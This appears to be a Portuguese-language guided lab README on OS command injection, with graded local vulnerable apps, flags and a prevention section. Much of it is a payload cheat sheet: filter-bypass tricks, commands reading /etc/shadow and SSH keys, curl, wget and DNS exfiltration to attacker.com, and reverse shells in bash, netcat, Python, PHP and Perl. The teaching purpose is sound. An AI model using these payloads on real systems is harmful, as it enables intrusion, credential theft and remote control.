# 💻 Command Injection - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟢 Iniciante → 🔴 Avançado
**Tempo estimado**: 3-5 horas
**Pontos**: 75 (10 + 25 + 40)

### O Que Você Vai Aprender

✅ Fundamentos de Command Injection (OS Command Injection)
✅ Separadores de comandos (`;`, `&&`, `||`, `|`, `\n`)
✅ Bypass de filtros e caracteres bloqueados
✅ Blind Command Injection (time-based, out-of-band)
✅ Reverse shells e backdoors
✅ Data exfiltration
✅ Comandos úteis por sistema operacional

---

## 📖 Teoria Completa

### O Que É Command Injection?

Command Injection é uma vulnerabilidade que permite que atacantes executem comandos arbitrários do sistema operacional no servidor que está rodando a aplicação.

### Como Funciona?

#### Código Vulnerável Clássico

```python
# VULNERÁVEL ❌
import os

filename = request.form.get('filename')
os.system(f'convert {filename} output.pdf')
```

**Input normal:**
```
filename: image.jpg
Comando: convert image.jpg output.pdf
```

**Input malicioso:**
```
filename: image.jpg; whoami
Comando executado: convert image.jpg output.pdf; whoami
```

Dois comandos são executados! O segundo revela o usuário atual.

---

## 🔥 Separadores de Comandos

### Unix/Linux

```bash
# Ponto e vírgula - executa ambos independentemente
command1 ; command2

# AND - executa command2 apenas se command1 suceder
command1 && command2

# OR - executa command2 apenas se command1 falhar
command1 || command2

# Pipe - passa output de command1 como input de command2
command1 | command2

# Newline - quebra de linha
command1
command2

# Redirecionamento
command1 > output.txt
command1 < input.txt
```

### Windows

```cmd
# Ponto e vírgula
command1 & command2

# AND
command1 && command2

# OR
command1 || command2

# Pipe
command1 | command2

# Newline
command1
command2
```

---

## 💉 Payloads Básicos

### 1. Identificação do Sistema

```bash
# Unix/Linux
; whoami
; id
; uname -a
; cat /etc/passwd

# Windows
& whoami
& ver
& systeminfo
& type C:\Windows\System32\drivers\etc\hosts
```

### 2. Listagem de Arquivos

```bash
# Unix/Linux
; ls -la
; pwd
; find / -name "*.conf"

# Windows
& dir
& cd
& dir C:\Windows\System32\config
```

### 3. Network Information

```bash
# Unix/Linux
; ifconfig
; ip addr
; netstat -tulpn
; arp -a

# Windows
& ipconfig
& netstat -ano
& arp -a
```

---

## 🔓 Técnicas de Bypass

### 1. Bypass de Espaços

Se espaços são filtrados:

```bash
# Usar $IFS (Internal Field Separator)
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Usar tabs (%09)
cat%09/etc/passwd

# Usar brace expansion
{cat,/etc/passwd}

# Redirecionamento
cat</etc/passwd

# Variáveis de ambiente
cat$IFS$1/etc/passwd
```

### 2. Bypass de Slash (/)

```bash
# Variáveis de ambiente
cat$HOME$1.bashrc
cat$PATH  # Mostra paths com /

# Encoding
cat /etc/passwd
cat /\etc/\passwd

# Wildcard
cat /???/passwd
```

### 3. Bypass de Palavras-chave

Se `cat`, `ls`, etc. são bloqueados:

```bash
# Aspas
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd

# Wildcards
c?t /etc/passwd
ca* /etc/passwd

# Comandos alternativos
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
tac /etc/passwd  # cat reverso
nl /etc/passwd   # numbered lines

# Comandos built-in
echo "$(<file.txt)"
```

### 4. Bypass de Caracteres Especiais

```bash
# URL encoding
%3B = ;
%26 = &
%7C = |
%0A = \n (newline)

# Hex
\x3b = ;

# Octal
\073 = ;
```

---

## 🕵️ Blind Command Injection

Quando não há output visível:

### 1. Time-Based Detection

```bash
# Teste se vulnerável
; sleep 10
& ping -n 10 127.0.0.1  # Windows
& timeout 10  # Windows

# Se demorar 10 segundos, é vulnerável!
```

### 2. Out-of-Band (DNS/HTTP)

```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com

# HTTP exfiltration
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id | base64)
```

### 3. File-Based Detection

```bash
# Criar arquivo e verificar depois
; touch /tmp/pwned.txt
; echo "vulnerable" > /var/www/html/pwned.txt

# Depois acesse: http://target.com/pwned.txt
```

---

## 🎯 Reverse Shells

### Bash

```bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

### Netcat

```bash
; nc attacker.com 4444 -e /bin/bash
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f
```

### Python

```bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### PHP

```bash
; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Perl

```bash
; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

---

## 📤 Data Exfiltration

### Via HTTP

```bash
# Envia /etc/passwd
; curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/log

# Base64 encode para evitar problemas
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
```

### Via DNS

```bash
# Quebra dados em chunks DNS
; for i in $(cat /etc/passwd); do nslookup $i.attacker.com; done

# Exfiltra em subdominio
; nslookup $(cat /etc/passwd | base64 | head -c 50).attacker.com
```

### Via ICMP (Ping)

```bash
# Ping com data
; ping -c 1 -p $(echo "data" | xxd -p) attacker.com
```

---

## 🛡️ Bypass de Filtros Comuns

### Filtro: `;`, `&`, `|` bloqueados

```bash
# Use newline
%0A whoami
%0D%0A whoami

# Use ${IFS}
cat${IFS}/etc/passwd
```

### Filtro: Espaços bloqueados

```bash
# Brace expansion
{cat,/etc/passwd}

# $IFS
cat$IFS/etc/passwd

# Tabs
cat%09/etc/passwd

# Redirecionamento
cat</etc/passwd
```

### Filtro: `/` bloqueado

```bash
# Usar variáveis
cat$HOME$1.bash_history

# Encoding
cat /\etc/\passwd

# Wildcard
cat /???/passwd
```

### Filtro: Palavras bloqueadas (cat, ls, etc)

```bash
# Aspas
c'a't file.txt
c"a"t file.txt

# Barra invertida
ca\t file.txt

# Wildcard
c?t file.txt
ca* file.txt

# Comandos alternativos
more file.txt
head file.txt
tail file.txt
```

---

## 🔬 Comandos Úteis por OS

### Linux/Unix

```bash
# Sistema
uname -a        # Kernel version
cat /etc/issue  # OS version
cat /etc/*-release
hostname
uptime

# Usuários
whoami
id
cat /etc/passwd
cat /etc/shadow  # Se tiver permissão
w                # Usuários logados

# Network
ifconfig
ip addr
ip route
netstat -tulpn
ss -tulpn
arp -a

# Processos
ps aux
ps -ef
top
lsof -i

# Arquivos sensíveis
cat /etc/passwd
cat /etc/shadow
cat ~/.bash_history
cat ~/.ssh/id_rsa
cat /var/log/apache2/access.log
cat /var/www/html/config.php

# Find
find / -name "*.conf" 2>/dev/null
find / -perm -4000 2>/dev/null  # SUID files
find / -writable 2>/dev/null
```

### Windows

```cmd
# Sistema
systeminfo
ver
hostname
echo %USERNAME%
whoami

# Network
ipconfig /all
netstat -ano
arp -a
route print

# Usuários
net user
net user Administrator
net localgroup Administrators

# Arquivos
dir C:\
dir C:\Windows\System32\config
type C:\Windows\System32\drivers\etc\hosts
type C:\inetpub\wwwroot\web.config

# Processos
tasklist
wmic process list

# Arquivos sensíveis
type C:\Users\Administrator\Desktop\flag.txt
dir /s *.txt
dir /s /b *.config
```

---

## 🏗️ Estrutura do Laboratório

### 1. 🟢 Basic App (10 pontos)
- **Arquivo**: `basic_app.py`
- **Porta**: 5050
- **Cenário**: Ping utility
- **Vulnerabilidades**:
  - Command Injection direto sem filtros
  - Multiple injection points

### 2. 🟡 Intermediate App (25 pontos)
- **Arquivo**: `intermediate_app.py`
- **Porta**: 5051
- **Cenário**: File converter (ImageMagick, ffmpeg)
- **Vulnerabilidades**:
  - Filtros básicos bypassáveis
  - Blind command injection
  - Multiple file formats

### 3. 🔴 Advanced App (40 pontos)
- **Arquivo**: `advanced_app.py`
- **Porta**: 5052
- **Cenário**: CI/CD automation
- **Vulnerabilidades**:
  - WAF avançado
  - Blind command injection
  - Docker command execution
  - Multiple bypass required

---

## 🚀 Quick Start

```bash
# Basic
cd learn/labs/guided/05-command-injection
python3 basic_app.py  # http://localhost:5050

# Intermediate
python3 intermediate_app.py  # http://localhost:5051

# Advanced
python3 advanced_app.py  # http://localhost:5052
```

---

## 🎯 Objetivos por Nível

### 🟢 Basic (10 pts)
- [ ] Executar `whoami`
- [ ] Executar `id`
- [ ] Listar arquivos com `ls`
- [ ] Ler `/etc/passwd`
- [ ] FLAG{basic_command_injection}

### 🟡 Intermediate (25 pts)
- [ ] Bypassar filtro de espaços
- [ ] Bypassar filtro de separadores
- [ ] Blind command injection (time-based)
- [ ] Data exfiltration via curl
- [ ] FLAG{intermediate_command_bypass}

### 🔴 Advanced (40 pts)
- [ ] Bypassar WAF complexo
- [ ] Blind out-of-band exfiltration
- [ ] Obter reverse shell
- [ ] Ler arquivos sensíveis via blind
- [ ] FLAG{advanced_blind_command}

---

## 🛡️ Prevenção

### 1. NÃO use comandos shell com input do usuário

```python
# ERRADO ❌
os.system(f'convert {filename} output.pdf')

# ERRADO ❌
subprocess.run(f'convert {filename} output.pdf', shell=True)
```

### 2. Use bibliotecas nativas (CORRETO ✅)

```python
# CORRETO ✅ - Use biblioteca Python
from PIL import Image
img = Image.open(filename)
img.save('output.pdf')

# CORRETO ✅ - Para operações de arquivo
import shutil
shutil.copy(filename, destination)
```

### 3. Se REALMENTE precisar usar comandos

```python
# CORRETO ✅ - subprocess sem shell
import subprocess
from pathlib import Path

# Validação estrita
allowed_extensions = ['.jpg', '.png', '.gif']
path = Path(filename)

if path.suffix not in allowed_extensions:
    raise ValueError("Invalid extension")

if not path.is_file():
    raise ValueError("File not found")

# Array de argumentos (não shell=True!)
subprocess.run(
    ['convert', str(path), 'output.pdf'],
    shell=False,  # IMPORTANTE!
    check=True,
    timeout=30
)
```

### 4. Whitelist de Valores

```python
# CORRETO ✅
ALLOWED_FORMATS = {
    'pdf': ['convert', '-format', 'pdf'],
    'png': ['convert', '-format', 'png'],
}

format_type = request.form.get('format')
if format_type not in ALLOWED_FORMATS:
    abort(400, "Invalid format")

command = ALLOWED_FORMATS[format_type] + [filename, output]
subprocess.run(command, shell=False, check=True)
```

### 5. Sandboxing

```python
# CORRETO ✅ - Execute em container isolado
import docker

client = docker.from_env()
container = client.containers.run(
    'alpine:latest',
    f'convert {filename} output.pdf',
    volumes={'/tmp': {'bind': '/workspace', 'mode': 'rw'}},
    remove=True,
    network_disabled=True  # Sem acesso à rede
)
```

---

## 📝 Checklist de Conclusão

- [ ] Entendi o que é Command Injection
- [ ] Executei comandos básicos (whoami, id, ls)
- [ ] Testei todos os separadores (;, &&, ||, |)
- [ ] Bypassei filtro de espaços
- [ ] Bypassei filtro de caracteres especiais
- [ ] Executei blind command injection
- [ ] Obtive reverse shell
- [ ] Exfiltrei dados via HTTP/DNS
- [ ] Completei todos os exercícios

**Total**: 75 pontos

---

## 🔗 Recursos Adicionais

### Cheat Sheets
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

### Ferramentas
- **Commix** - Automated command injection
  ```bash
  commix --url="http://target.com/ping" --data="ip=127.0.0.1"
  ```

### Plataformas de Prática
- PortSwigger Academy - OS Command Injection labs
- HackTheBox - Máquinas com command injection
- PentesterLab - Command injection exercises

---

## 🎓 Próximos Passos

Após dominar Command Injection:

1. **Escalação de Privilégios** - Usar command injection para virar root
2. **Lateral Movement** - Pivotar para outros sistemas
3. **Persistence** - Backdoors e cron jobs
4. **Container Escape** - Quebrar isolamento Docker

**Próximo Lab**: [06 - Path Traversal →](../06-path-traversal/README.md)

---

**Boa sorte e happy hacking! 💻**
